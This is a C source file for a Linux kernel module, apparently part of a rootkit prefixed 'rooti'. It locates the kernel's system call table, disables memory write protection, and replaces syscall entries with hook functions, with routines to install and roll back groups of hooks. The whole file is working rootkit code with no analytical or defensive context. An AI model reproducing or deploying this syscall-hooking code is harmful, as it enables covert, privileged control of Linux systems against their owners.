#include <linux/types.h>
#include <linux/errno.h>
#include "utils.h"
#include "syscall.h"
#include "../utils.h"

unsigned long *__sys_call_table = NULL;

int rooti_resolve_syscall_table_addr()
{
    ROOTI_RESOLVE_SYM_ADDR(unsigned long *, sys_call_table, -ENOENT)
    return 0;
}

int rooti_install_syscall_hook(struct rooti_syscall_hook *hook)
{
    *((unsigned long *)hook->orig) = __sys_call_table[hook->idx];

    rooti_unprotect_memory();
    __sys_call_table[hook->idx] = (unsigned long)hook->func;
    rooti_protect_memory();

    return 0;
}

void rooti_uninstall_syscall_hook(struct rooti_syscall_hook *hook)
{   
    rooti_unprotect_memory();
    __sys_call_table[hook->idx] = *((unsigned long *)hook->orig);
    rooti_protect_memory();
}

int rooti_install_syscall_hooks(struct rooti_syscall_hook *hooks, size_t count)
{
    int ret;
    int i;

    for (i = 0; i < count; i++) {
        ret = rooti_install_syscall_hook(&hooks[i]);
        if (ret < 0) {
            goto error;
        }
    }
    return 0;

error:
    while (i > 0) {
        rooti_uninstall_syscall_hook(&hooks[--i]);
    }
    return ret;
}

void rooti_uninstall_syscall_hooks(struct rooti_syscall_hook *hooks, size_t count)
{
    for (int i = 0; i < count; i++) {
        rooti_uninstall_syscall_hook(&hooks[i]);
    }
}